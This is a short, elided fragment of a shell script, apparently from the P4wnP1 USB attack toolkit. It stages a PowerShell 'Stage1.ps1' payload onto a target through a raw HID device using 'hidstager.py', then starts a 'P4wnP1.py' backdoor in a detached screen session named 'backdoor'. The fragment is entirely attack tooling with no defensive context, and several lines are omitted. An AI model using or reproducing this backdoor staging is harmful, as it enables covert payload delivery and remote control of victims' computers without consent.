...
python3 /usr/local/P4wnP1/scripts/backdoor/hidstager.py -s -i /usr/local/P4wnP1/scripts/backdoor/Stage1.ps1 -o $hidraw &
...
if ! ps -aux | grep P4wnP1.py | grep -q -v grep; then
        ...
        screen -dmS backdoor bash -c "python3 /usr/local/P4wnP1/scripts/backdoor/P4wnP1.py"
